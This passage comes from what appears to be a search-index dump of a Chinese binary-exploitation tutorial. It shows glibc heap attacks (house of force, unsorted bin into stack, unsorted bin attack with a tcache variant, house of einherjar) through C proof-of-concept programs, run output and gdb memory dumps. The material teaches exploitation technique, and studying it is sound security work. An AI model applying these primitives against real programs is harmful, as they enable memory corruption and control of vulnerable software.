\u90fd\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u9700\u8981\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u4ece top chunk \u4e2d\u5206\u51fa\u4e00\u5757\u5185\u5b58\u7ed9\u7528\u6237\u3002\u6240\u4ee5 top chunk \u7684\u5927\u5c0f\u4f1a\u968f\u7740\u5206\u914d\u548c\u56de\u6536\u4e0d\u505c\u5730\u53d8\u5316\u3002\u8fd9\u79cd\u653b\u51fb\u5047\u8bbe\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 top chunk \u7684\u5934\u90e8\uff0c\u7136\u540e\u5c06\u5176\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u503c\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u7684 malloc \u5c06\u4f7f\u7528 top chunk \u5206\u914d\uff0c\u800c\u4e0d\u4f1a\u8c03\u7528 mmap\u3002\u8fd9\u65f6\u5982\u679c\u653b\u51fb\u8005 malloc \u4e00\u4e2a\u5f88\u5927\u7684\u6570\u76ee\uff08\u8d1f\u6709\u7b26\u53f7\u6574\u6570\uff09\uff0ctop chunk \u7684\u4f4d\u7f6e\u52a0\u4e0a\u8fd9\u4e2a\u5927\u6570\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\uff0c\u7ed3\u679c\u662f top chunk \u80fd\u591f\u88ab\u8f6c\u79fb\u5230\u5806\u4e4b\u524d\u7684\u5185\u5b58\u5730\u5740\uff08\u5982\u7a0b\u5e8f\u7684 .bss \u6bb5\u3001.data \u6bb5\u3001GOT \u8868\u7b49\uff09\uff0c\u4e0b\u6b21\u518d\u6267\u884c malloc \u65f6\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u591f\u63a7\u5236\u8f6c\u79fb\u4e4b\u540e\u5730\u5740\u5904\u7684\u5185\u5b58\u3002 \u9996\u5148\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u6b64\u65f6\u5185\u5b58\u91cc\u5b58\u5728\u4e24\u4e2a chunk\uff0c\u5373 chunk 1 \u548c top chunk\uff1a gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000020fe1 <-- top chunk 0x602030: 0x0000000000000000 0x0000000000000000 chunk 1 \u771f\u5b9e\u53ef\u7528\u7684\u5185\u5b58\u6709 0x18 \u5b57\u8282\u3002 \u5047\u8bbe chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u6211\u4eec\u73b0\u5728\u5c06 top chunk \u7684 size \u503c\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6570\uff1a gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0xffffffffffffffff <-- modified top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u6539\u5199\u4e4b\u540e\u7684 size==0xffffffff\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5 malloc \u4e00\u4e2a\u4efb\u610f\u5927\u5c0f\u7684\u5185\u5b58\u800c\u4e0d\u7528\u8c03\u7528 mmap \u4e86\u3002\u63a5\u4e0b\u6765 malloc \u4e00\u4e2a chunk\uff0c\u4f7f\u5f97\u8be5 chunk \u521a\u597d\u5206\u914d\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u90a3\u5757\u533a\u57df\u4e3a\u6b62\uff0c\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u533a\u57df\u4e86\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528\u76ee\u6807\u5730\u5740\u51cf\u53bb top chunk \u5730\u5740\uff0c\u518d\u51cf\u53bb chunk \u5934\u7684\u5927\u5c0f\u3002 gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0xfffffffffffff051 0x602030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/12gx 0x602010+0xfffffffffffff050 0x601060: 0x4141414141414141 0x4141414141414141 0x601070: 0x4141414141414141 0x0000000000000fa9 <-- top chunk 0x601080 <bss_var>: 0x2073692073696854 0x676e697274732061 <-- target 0x601090 <bss_var+16>: 0x6577207461687420 0x6f7420746e617720 0x6010a0 <bss_var+32>: 0x6972777265766f20 0x00000000002e6574 0x6010b0: 0x0000000000000000 0x0000000000000000 \u518d\u6b21 malloc\uff0c\u5c06\u76ee\u6807\u5730\u5740\u5305\u542b\u8fdb\u6765\u5373\u53ef\uff0c\u73b0\u5728\u6211\u4eec\u5c31\u6210\u529f\u63a7\u5236\u4e86\u76ee\u6807\u5185\u5b58\uff1a gef\u27a4 x/12gx 0x602010+0xfffffffffffff050 0x601060: 0x4141414141414141 0x4141414141414141 0x601070: 0x4141414141414141 0x0000000000000041 <-- chunk 2 0x601080 <bss_var>: 0x2073692073696854 0x676e697274732061 <-- target 0x601090 <bss_var+16>: 0x6577207461687420 0x6f7420746e617720 0x6010a0 <bss_var+32>: 0x6972777265766f20 0x00000000002e6574 0x6010b0: 0x0000000000000000 0x0000000000000f69 <-- top chunk \u8be5\u6280\u672f\u7684\u7f3a\u70b9\u662f\u4f1a\u53d7\u5230 ASLR \u7684\u5f71\u54cd\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u9700\u8981\u4fee\u6539\u6307\u5b9a\u4f4d\u7f6e\u7684\u5185\u5b58\uff0c\u4ed6\u9996\u5148\u9700\u8981\u77e5\u9053\u5f53\u524d top chunk \u7684\u4f4d\u7f6e\u4ee5\u6784\u9020\u5408\u9002\u7684 malloc \u5927\u5c0f\u6765\u8f6c\u79fb top chunk\u3002\u800c ASLR \u5c06\u4f7f\u5806\u5185\u5b58\u5730\u5740\u968f\u673a\uff0c\u6240\u4ee5\u8be5\u6280\u672f\u8fd8\u9700\u540c\u65f6\u914d\u5408\u4f7f\u7528\u4fe1\u606f\u6cc4\u6f0f\u4ee5\u8fbe\u6210\u653b\u51fb\u3002","title":"house_of_force"},{"location":"Tutorial/Material/Binary%20Exploitation/#unsorted_bin_into_stack","text":"#include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_buf[4] = {0}; unsigned long *victim = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Allocating the victim chunk at %p\\n\", victim); // deal with tcache // int *k[10], i; // for (i = 0; i < 7; i++) { // k[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(victim); fprintf(stderr, \"Freeing the chunk, it will be inserted in the unsorted bin\\n\\n\"); stack_buf[1] = 0x100 + 0x10; stack_buf[3] = (unsigned long)stack_buf; // or any other writable address fprintf(stderr, \"Create a fake chunk on the stack\\n\"); fprintf(stderr, \"fake->size: %p\\n\", (void *)stack_buf[1]); fprintf(stderr, \"fake->bk: %p\\n\\n\", (void *)stack_buf[3]); victim[1] = (unsigned long)stack_buf; fprintf(stderr, \"Now we overwrite the victim->bk pointer to stack: %p\\n\\n\", stack_buf); fprintf(stderr, \"Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\\n\", &stack_buf[2]); unsigned long *fake = malloc(0x100); fprintf(stderr, \"malloc(0x100): %p\\n\", fake); } $ gcc -g unsorted_bin_into_stack.c $ ./a.out Allocating the victim chunk at 0x17a1010 Freeing the chunk, it will be inserted in the unsorted bin Create a fake chunk on the stack fake->size: 0x110 fake->bk: 0x7fffcd906480 Now we overwrite the victim->bk pointer to stack: 0x7fffcd906480 Malloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490 malloc(0x100): 0x7fffcd906490 unsorted-bin-into-stack \u901a\u8fc7\u6539\u5199 unsorted bin \u91cc chunk \u7684 bk \u6307\u9488\u5230\u4efb\u610f\u5730\u5740\uff0c\u4ece\u800c\u5728\u6808\u4e0a malloc \u51fa chunk\u3002 \u9996\u5148\u5c06\u4e00\u4e2a chunk \u653e\u5165 unsorted bin\uff0c\u5e76\u4e14\u5728\u6808\u4e0a\u4f2a\u9020\u4e00\u4e2a chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbc0 \u7136\u540e\u5047\u8bbe\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 victim chunk \u7684 bk \u6307\u9488\uff0c\u90a3\u4e48\u5c06\u5176\u6539\u4e3a\u6307\u5411 fake chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1b78 0x00007fffffffdbc0 <-- bk pointer 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbc0 \u90a3\u4e48\u6b64\u65f6\u5c31\u76f8\u5f53\u4e8e fake chunk \u5df2\u7ecf\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\u3002\u5728\u4e0b\u4e00\u6b21 malloc \u7684\u65f6\u5019\uff0cmalloc \u4f1a\u987a\u7740 bk \u6307\u9488\u8fdb\u884c\u904d\u5386\uff0c\u4e8e\u662f\u5c31\u627e\u5230\u4e86\u5927\u5c0f\u6b63\u597d\u5408\u9002\u7684 fake chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1bf8 0x00007ffff7dd1bf8 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx fake - 2 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x00007ffff7dd1b78 0x00007fffffffdbc0 fake chunk \u88ab\u53d6\u51fa\uff0c\u800c victim chunk \u88ab\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u653e\u5230\u4e86 small bin \u4e2d\u3002\u53e6\u5916\u503c\u5f97\u6ce8\u610f\u7684\u662f fake chunk \u7684 fd \u6307\u9488\u88ab\u4fee\u6539\u4e86\uff0c\u8fd9\u662f unsorted bin \u7684\u5730\u5740\uff0c\u901a\u8fc7\u5b83\u53ef\u4ee5\u6cc4\u9732 libc \u5730\u5740\uff0c\u8fd9\u6b63\u662f\u4e0b\u9762 unsorted bin attack \u4f1a\u8bb2\u5230\u7684\u3002 \u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u89e3\u9664\u6ce8\u91ca\uff0c\u5c31\u662f libc-2.27 \u73af\u5883\u4e0b\u7684\u7248\u672c\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e tcache \u7684\u5f71\u54cd\uff0c stack_buf[3] \u4e0d\u80fd\u518d\u8bbe\u7f6e\u6210\u4efb\u610f\u5730\u5740\u3002 malloc \u524d\uff1a gdb-peda$ x/6gx victim - 2 0x555555756250: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x555555756260: 0x00007ffff7dd2b00 0x00007fffffffdcb0 0x555555756270: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdcc0: 0x0000000000000000 0x00007fffffffdcb0 gdb-peda$ x/26gx 0x0000555555756000+0x10 0x555555756010: 0x0700000000000000 0x0000000000000000 <-- counts 0x555555756020: 0x0000000000000000 0x0000000000000000 0x555555756030: 0x0000000000000000 0x0000000000000000 0x555555756040: 0x0000000000000000 0x0000000000000000 0x555555756050: 0x0000000000000000 0x0000000000000000 0x555555756060: 0x0000000000000000 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000555555756670 <-- entries 0x555555756090: 0x0000000000000000 0x0000000000000000 0x5555557560a0: 0x0000000000000000 0x0000000000000000 0x5555557560b0: 0x0000000000000000 0x0000000000000000 0x5555557560c0: 0x0000000000000000 0x0000000000000000 0x5555557560d0: 0x0000000000000000 0x0000000000000000 malloc \u540e\uff1a gdb-peda$ x/6gx victim - 2 0x555555756250: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x555555756260: 0x00007ffff7dd2b80 0x00007ffff7dd2b80 0x555555756270: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx fake - 2 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdcc0: 0x00007ffff7dd2b00 0x00007fffffffdcb0 gdb-peda$ x/26gx 0x0000555555756000+0x10 0x555555756010: 0x0700000000000000 0x0700000000000000 <-- counts <-- counts 0x555555756020: 0x0000000000000000 0x0000000000000000 0x555555756030: 0x0000000000000000 0x0000000000000000 0x555555756040: 0x0000000000000000 0x0000000000000000 0x555555756050: 0x0000000000000000 0x0000000000000000 0x555555756060: 0x0000000000000000 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000555555756670 <-- entries 0x555555756090: 0x0000000000000000 0x0000000000000000 0x5555557560a0: 0x0000000000000000 0x0000000000000000 0x5555557560b0: 0x0000000000000000 0x0000000000000000 0x5555557560c0: 0x0000000000000000 0x00007fffffffdcc0 <-- entries 0x5555557560d0: 0x0000000000000000 0x0000000000000000 \u53ef\u4ee5\u770b\u5230\u5728 malloc \u65f6\uff0cfake chunk \u88ab\u4e0d\u65ad\u91cd\u590d\u5730\u94fe\u63a5\u5230 tcache bin\uff0c\u76f4\u5230\u88c5\u6ee1\u540e\uff0c\u624d\u4ece unsorted bin \u91cc\u53d6\u51fa\u3002\u540c\u6837\u7684\uff0cfake chunk \u7684 fd \u6307\u5411 unsorted bin\u3002","title":"unsorted_bin_into_stack"},{"location":"Tutorial/Material/Binary%20Exploitation/#unsorted_bin_attack","text":"#include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_var = 0; fprintf(stderr, \"The target we want to rewrite on stack: %p -> %ld\\n\\n\", &stack_var, stack_var); unsigned long *p = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p); free(p); fprintf(stderr, \"We free the first chunk now. Its bk pointer point to %p\\n\", (void*)p[1]); p[1] = (unsigned long)(&stack_var - 2); fprintf(stderr, \"We write it with the target address-0x10: %p\\n\\n\", (void*)p[1]); malloc(0x80); fprintf(stderr, \"Let's malloc again to get the chunk we just free: %p -> %p\\n\", &stack_var, (void*)stack_var); } $ gcc -g unsorted_bin_attack.c $ ./a.out The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0 Now, we allocate first small chunk on the heap at: 0x1066010 We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78 We write it with the target address-0x10: 0x7ffc9b1d61a0 Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78 unsorted bin \u653b\u51fb\u901a\u5e38\u662f\u4e3a\u66f4\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u505a\u51c6\u5907\u7684\uff0c\u6211\u4eec\u77e5\u9053 unsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5728\u5206\u914d\u65f6\u4f1a\u901a\u8fc7 unlink \u64cd\u4f5c\u5c06 chunk \u4ece\u94fe\u8868\u4e2d\u79fb\u9664\uff0c\u6240\u4ee5\u5982\u679c\u80fd\u591f\u63a7\u5236 unsorted bin chunk \u7684 bk \u6307\u9488\uff0c\u5c31\u53ef\u4ee5\u5411\u4efb\u610f\u4f4d\u7f6e\u5199\u5165\u4e00\u4e2a\u6307\u9488\u3002\u8fd9\u91cc\u901a\u8fc7 unlink \u5c06 libc \u7684\u4fe1\u606f\u5199\u5165\u5230\u6211\u4eec\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\uff0c\u4ece\u800c\u5bfc\u81f4\u4fe1\u606f\u6cc4\u6f0f\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u653b\u51fb\u63d0\u4f9b\u4fbf\u5229\u3002 unlink \u7684\u5bf9 unsorted bin \u7684\u64cd\u4f5c\u662f\u8fd9\u6837\u7684\uff1a /* remove from unsorted list */ unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); \u5176\u4e2d bck = victim->bk \u3002 \u9996\u5148\u5206\u914d\u4e24\u4e2a chunk\uff0c\u7136\u540e\u91ca\u653e\u6389\u7b2c\u4e00\u4e2a\uff0c\u5b83\u5c06\u88ab\u52a0\u5165\u5230 unsorted bin \u4e2d\uff1a gef\u27a4 x/26gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 1 [be freed] 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <-- chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx &stack_var-2 0x7fffffffdc50: 0x00007fffffffdd60 0x0000000000400712 0x7fffffffdc60: 0x0000000000000000 0x0000000000602010 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) \u7136\u540e\u5047\u8bbe\u5b58\u5728\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u4fee\u6539 chunk 1 \u7684\u6570\u636e\u3002\u7136\u540e\u6211\u4eec\u5c06 chunk 1 \u7684 bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5411\u76ee\u6807\u5730\u5740 - 2\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u662f\u5728\u76ee\u6807\u5730\u5740\u5904\u6709\u4e00\u4e2a fake free chunk\uff0c\u7136\u540e malloc\uff1a gef\u27a4 x/26gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000091 <-- chunk 3 0x602010: 0x00007ffff7dd1b78 0x00007fffffffdc50 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000021 <-- chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <-- top chunk 0x6020c0: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx &stack_var-2 0x7fffffffdc50: 0x00007fffffffdc80 0x0000000000400756 <-- fake chunk 0x7fffffffdc60: 0x00007ffff7dd1b78 0x0000000000602010 <-- fd->TAIL \u4ece\u800c\u6cc4\u6f0f\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002 \u90a3\u4e48\u7ee7\u7eed\u6765\u770b libc-2.27 \u91cc\u600e\u4e48\u5904\u7406\uff1a #include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_var = 0; fprintf(stderr, \"The target we want to rewrite on stack: %p -> %ld\\n\\n\", &stack_var, stack_var); unsigned long *p = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Now, we allocate first small chunk on the heap at: %p\\n\",p); free(p); fprintf(stderr, \"Freed the first chunk to put it in a tcache bin\\n\"); p[0] = (unsigned long)(&stack_var); fprintf(stderr, \"Overwrite the next ptr with the target address\\n\"); malloc(0x80); malloc(0x80); fprintf(stderr, \"Now we malloc twice to make tcache struct's counts '0xff'\\n\\n\"); free(p); fprintf(stderr, \"Now free again to put it in unsorted bin\\n\"); p[1] = (unsigned long)(&stack_var - 2); fprintf(stderr, \"Now write its bk ptr with the target address-0x10: %p\\n\\n\", (void*)p[1]); malloc(0x80); fprintf(stderr, \"Finally malloc again to get the chunk at target address: %p -> %p\\n\", &stack_var, (void*)stack_var); } $ gcc -g tcache_unsorted_bin_attack.c $ ./a.out The target we want to rewrite on stack: 0x7ffef0884c10 -> 0 Now, we allocate first small chunk on the heap at: 0x564866907260 Freed the first chunk to put it in a tcache bin Overwrite the next ptr with the target address Now we malloc twice to make tcache struct's counts '0xff' Now free again to put it in unsorted bin Now write its bk ptr with the target address-0x10: 0x7ffef0884c00 Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0 \u6211\u4eec\u77e5\u9053\u7531\u4e8e tcache \u7684\u5b58\u5728\uff0cmalloc \u4ece unsorted bin \u53d6 chunk \u7684\u65f6\u5019\uff0c\u5982\u679c\u5bf9\u5e94\u7684 tcache bin \u8fd8\u672a\u88c5\u6ee1\uff0c\u5219\u4f1a\u5c06 unsorted bin \u91cc\u7684 chunk \u5168\u90e8\u653e\u8fdb\u5bf9\u5e94\u7684 tcache bin\uff0c\u7136\u540e\u518d\u4ece tcache bin \u4e2d\u53d6\u51fa\u3002\u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5728\u653e\u8fdb tcache bin \u7684\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0cmalloc \u4f1a\u4ee5\u4e3a\u6211\u4eec\u7684 target address \u4e5f\u662f\u4e00\u4e2a chunk\uff0c\u7136\u800c\u8fd9\u4e2a \"chunk\" \u662f\u8fc7\u4e0d\u4e86\u68c0\u67e5\u7684\uff0c\u5c06\u629b\u51fa \"memory corruption\" \u7684\u9519\u8bef\uff1a while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) { bck = victim->bk; if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) > av->system_mem, 0)) malloc_printerr (\"malloc(): memory corruption\"); \u90a3\u4e48\u8981\u60f3\u8df3\u8fc7\u653e chunk \u7684\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u5c31\u9700\u8981\u5bf9\u5e94 tcache bin \u7684 counts \u57df\u4e0d\u5c0f\u4e8e tcache_count\uff08\u9ed8\u8ba4\u4e3a7\uff09\uff0c\u4f46\u5982\u679c counts \u4e0d\u4e3a 0\uff0c\u8bf4\u660e tcache bin \u91cc\u662f\u6709 chunk \u7684\uff0c\u90a3\u4e48 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4ece tcache bin \u91cc\u53d6\u51fa\uff0c\u4e8e\u662f\u5c31\u6ca1\u6709 unsorted bin \u4ec0\u4e48\u4e8b\u4e86\uff1a if (tc_idx < mp_.tcache_bins /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache && tcache->entries[tc_idx] != NULL) { return tcache_get (tc_idx); } \u8fd9\u5c31\u9020\u6210\u4e86\u77db\u76fe\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u79cd\u65e2\u80fd\u4ece unsorted bin \u4e2d\u53d6 chunk\uff0c\u53c8\u4e0d\u4f1a\u5c06 chunk \u653e\u8fdb tcache bin \u7684\u529e\u6cd5\u3002 \u4e8e\u662f\u5c31\u5f97\u5230\u4e86\u4e0a\u9762\u7684\u5229\u7528 tcache poisoning\uff08\u53c2\u8003\u7ae0\u82824.14\uff09\uff0c\u5c06 counts \u4fee\u6539\u6210\u4e86 0xff \uff0c\u4e8e\u662f\u5728\u8fdb\u884c\u5230\u4e0b\u9762\u8fd9\u91cc\u65f6\u5c31\u4f1a\u8fdb\u5165 else \u5206\u652f\uff0c\u76f4\u63a5\u53d6\u51fa chunk \u5e76\u8fd4\u56de\uff1a #if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb && tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (victim, tc_idx); return_cached = 1; continue; } else { #endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; \u4e8e\u662f\u5c31\u6210\u529f\u6cc4\u9732\u51fa\u4e86 unsorted bin \u7684\u5934\u90e8\u5730\u5740\u3002","title":"unsorted_bin_attack"},{"location":"Tutorial/Material/Binary%20Exploitation/#house_of_einherjar","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { uint8_t *a, *b, *d; a = (uint8_t*) malloc(0x10); int real_a_size = malloc_usable_size(a); memset(a, 'A', real_a_size); fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\\n\", a); size_t fake_chunk[6]; fake_chunk[0] = 0x80; fake_chunk[1] = 0x80; fake_chunk[2] = (size_t) fake_chunk; fake_chunk[3] = (size_t) fake_chunk; fake_chunk[4] = (size_t) fake_chunk; fake_chunk[5] = (size_t) fake_chunk; fprintf(stderr, \"Our fake chunk at %p looks like:\\n\", fake_chunk); fprintf(stderr, \"prev_size: %#lx\\n\", fake_chunk[0]); fprintf(stderr, \"size: %#lx\\n\", fake_chunk[1]); fprintf(stderr, \"fwd: %#lx\\n\", fake_chunk[2]); fprintf(stderr, \"bck: %#lx\\n\", fake_chunk[3]); fprintf(stderr, \"fwd_nextsize: %#lx\\n\", fake_chunk[4]); fprintf(stderr, \"bck_nextsize: %#lx\\n\\n\", fake_chunk[5]); b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); uint64_t* b_size_ptr = (uint64_t*)(b - 0x8); fprintf(stderr, \"We allocate 0xf8 bytes for 'b': %p\\n\", b); fprintf(stderr, \"b.size: %#lx\\n\", *b_size_ptr); fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); a[real_a_size] = 0; fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size; fprintf(stderr, \"We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\\n\", sizeof(size_t)); fprintf(stderr, \"Our fake prev_size will be %p - %p = %#lx\\n\\n\", b-sizeof(size_t)*2, fake_chunk, fake_size); fake_chunk[1] = fake_size; fprintf(stderr, \"Modify fake chunk's size to reflect b's new prev_size\\n\"); fprintf(stderr, \"Now we free b and this will consolidate with our fake chunk\\n\"); free(b); fprintf(stderr, \"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\", fake_chunk[1]); d = malloc(0x10); memset(d, 'A', 0x10); fprintf(stderr, \"\\nNow we can call malloc() and it will begin in our fake chunk: %p\\n\", d); } $ gcc -g house_of_einherjar.c $ ./a.out We allocate 0x10 bytes for 'a': 0xb31010 Our fake chunk at 0x7ffdb337b7f0 looks like: prev_size: 0x80 size: 0x80 fwd: 0x7ffdb337b7f0 bck: 0x7ffdb337b7f0 fwd_nextsize: 0x7ffdb337b7f0 bck_nextsize: 0x7ffdb337b7f0 We allocate 0xf8 bytes for 'b': 0xb31030 b.size: 0x101 We overflow 'a' with a single null byte into the metadata of 'b' b.size: 0x100 We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830 Modify fake chunk's size to reflect b's new prev_size Now we free b and this will consolidate with our fake chunk Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size) Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800 house-of-einherjar \u662f\u4e00\u79cd\u5229\u7528 malloc \u6765\u8fd4\u56de\u4e00\u4e2a\u9644\u8fd1\u5730\u5740\u7684\u4efb\u610f\u6307\u9488\u3002\u5b83\u8981\u6c42\u6709\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8986\u76d6\u6389 next chunk \u7684 size \u5b57\u6bb5\u5e76\u6e05\u9664 PREV_IN_USE \u6807\u5fd7\uff0c\u7136\u540e\u8fd8\u9700\u8981\u8986\u76d6 prev_size \u5b57\u6bb5\u4e3a fake chunk \u7684\u5927\u5c0f\u3002\u5f53 next chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4f1a\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u88ab\u6807\u8bb0\u4e3a\u7a7a\u95f2\u72b6\u6001\uff0c\u7136\u540e\u5c1d\u8bd5\u5408\u5e76\u5806\u5757\u3002\u53ea\u8981\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u4e00\u4e2a fake 